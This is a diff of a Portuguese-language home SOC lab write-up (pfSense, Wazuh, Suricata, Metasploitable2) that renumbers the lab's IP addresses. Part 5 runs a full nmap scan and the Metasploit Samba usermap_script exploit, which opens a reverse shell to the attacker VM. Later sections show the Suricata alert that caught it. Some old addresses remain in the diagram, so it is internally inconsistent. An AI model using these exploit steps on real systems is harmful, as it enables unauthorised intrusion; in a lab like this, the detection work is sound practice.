@@ -36,15 +36,15 @@ Ao longo do processo, dois problemas reais de infraestrutura foram diagnosticado
                     │   pfSense (CE)    │
                     │  WAN: VMnet8/NAT  │
                     │  LAN: VMnet1      │
-                    │  192.168.220.254  │
+                    │  10.10.10.1  │
                     └─────────┬─────────┘
                               │
               ┌───────────────┼───────────────┬──────────────────┐
               │               │                │                  │
      ┌────────┴───────┐ ┌─────┴──────┐ ┌───────┴────────┐ ┌──────┴───────┐
      │  Kali Linux     │ │  Wazuh Mgr  │ │ Windows Server  │ │ Metasploit-  │
-     │  192.168.220.130│ │  (Ubuntu)   │ │      2025        │ │  able2       │
-     │  Suricata 8.0.5 │ │192.168.220. │ │192.168.220.50    │ │192.168.220.  │
+     │  10.10.10.20│ │  (Ubuntu)   │ │      2025        │ │  able2       │
+     │  Suricata 8.0.5 │ │192.168.220. │ │10.10.10.40    │ │192.168.220.  │
      │  Juice Shop     │ │     103     │ │Sysmon + Wazuh    │ │     152      │
      │  (Docker :3000) │ │             │ │     Agent        │ │  (DHCP)      │
      └─────────────────┘ └─────────────┘ └──────────────────┘ └──────────────┘
@@ -52,11 +52,11 @@ Ao longo do processo, dois problemas reais de infraestrutura foram diagnosticado
 
 | Host | IP | Função |
 |---|---|---|
-| pfSense | 192.168.220.254 | Gateway/firewall da LAN |
-| Wazuh Manager (Ubuntu) | 192.168.220.103 | SIEM/XDR |
-| Kali Linux | 192.168.220.130 | Atacante + Suricata + Juice Shop (Docker) |
-| Windows Server 2025 (`win-srv01`) | 192.168.220.50 | Endpoint monitorado (Sysmon + Wazuh Agent) |
-| Metasploitable2 | 192.168.220.152 (DHCP) | Alvo vulnerável (descartável) |
+| pfSense | 10.10.10.1 | Gateway/firewall da LAN |
+| Wazuh Manager (Ubuntu) | 10.10.10.10 | SIEM/XDR |
+| Kali Linux | 10.10.10.20 | Atacante + Suricata + Juice Shop (Docker) |
+| Windows Server 2025 (`win-srv01`) | 10.10.10.40 | Endpoint monitorado (Sysmon + Wazuh Agent) |
+| Metasploitable2 | 10.10.10.30 (DHCP) | Alvo vulnerável (descartável) |
 
 Todos os hosts estão na mesma VMnet1 (Host-only), com o pfSense atuando como gateway — todo tráfego de saída passa por ele, permitindo inspeção e logging centralizados.
 
@@ -101,13 +101,13 @@ Get-NetIPInterface -InterfaceAlias "Ethernet0" -AddressFamily IPv4 | Select-Obje
 Remove-NetIPAddress -InterfaceAlias "Ethernet0" -Confirm:$false
 Remove-NetRoute -InterfaceAlias "Ethernet0" -Confirm:$false -ErrorAction SilentlyContinue
 Set-NetIPInterface -InterfaceAlias "Ethernet0" -Dhcp Disabled
-New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.220.50 -PrefixLength 24 -DefaultGateway 192.168.220.254
-Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.220.254
+New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.10.10.40 -PrefixLength 24 -DefaultGateway 10.10.10.1
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 10.10.10.1
 ```
 
 Validação:
 ```powershell
-ping 192.168.220.254   # gateway
+ping 10.10.10.1   # gateway
 ping 8.8.8.8            # saída à internet via pfSense
 ```
 
@@ -165,7 +165,7 @@ Deploy gerado pelo próprio dashboard (**Agents management → Deploy new agent 
 
 ```powershell
 Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.5-1.msi -OutFile $env:tmp\wazuh-agent.msi
-msiexec.exe /i $env:tmp\wazuh-agent.msi /q WAZUH_MANAGER='192.168.220.103' WAZUH_AGENT_NAME='win-srv01'
+msiexec.exe /i $env:tmp\wazuh-agent.msi /q WAZUH_MANAGER='10.10.10.10' WAZUH_AGENT_NAME='win-srv01'
 NET START WazuhSvc
 ```
 
@@ -225,10 +225,10 @@ Após o primeiro teste de ataque (ver Parte 5), nenhum evento relacionado ao alv
 
 ```bash
 grep -A 5 "af-packet:" /etc/suricata/suricata.yaml
-# interface: eth1   <- rede secundária do Kali (192.168.218.0/24)
+# interface: eth1   <- rede secundária do Kali (10.10.20.0/24)
 ```
 
-O Suricata estava capturando tráfego na interface **errada** — `eth1`, não `eth0` (`192.168.220.0/24`, onde o ataque de fato ocorreu). Corrigido:
+O Suricata estava capturando tráfego na interface **errada** — `eth1`, não `eth0` (`10.10.10.0/24`, onde o ataque de fato ocorreu). Corrigido:
 
 ```yaml
 af-packet:
@@ -248,7 +248,7 @@ sudo systemctl restart suricata
 ### 5.1 Reconhecimento
 
 ```bash
-nmap -sV -p- 192.168.220.152
+nmap -sV -p- 10.10.10.30
 ```
 Confirmados serviços vulneráveis clássicos: `vsftpd 2.3.4` (porta 21), `Samba smbd 3.X` (139/445), `UnrealIRCd` (6667), `distccd` (3632).
 
@@ -262,10 +262,10 @@ Suricata: Alert - POSSBL PORT SCAN (NMAP -sA)
 CVE-2007-2447 — Samba `usermap_script`:
 ```
 msf > use exploit/multi/samba/usermap_script
-msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.220.152
-msf exploit(multi/samba/usermap_script) > set LHOST 192.168.220.130
+msf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.30
+msf exploit(multi/samba/usermap_script) > set LHOST 10.10.10.20
 msf exploit(multi/samba/usermap_script) > run
-[*] Command shell session 1 opened (192.168.220.130:4444 -> 192.168.220.152:43643)
+[*] Command shell session 1 opened (10.10.10.20:4444 -> 10.10.10.30:43643)
 ```
 
 Confirmação de acesso root:
@@ -281,8 +281,8 @@ Após a correção da interface (Parte 4), o reteste confirmou o alerta de explo
 ```json
 {
   "event_type": "alert",
-  "src_ip": "192.168.220.152",
-  "dest_ip": "192.168.220.130",
+  "src_ip": "10.10.10.30",
+  "dest_ip": "10.10.10.20",
   "dest_port": 4444,
   "alert": {
     "signature": "POSSBL SCAN SHELL M-SPLOIT TCP",
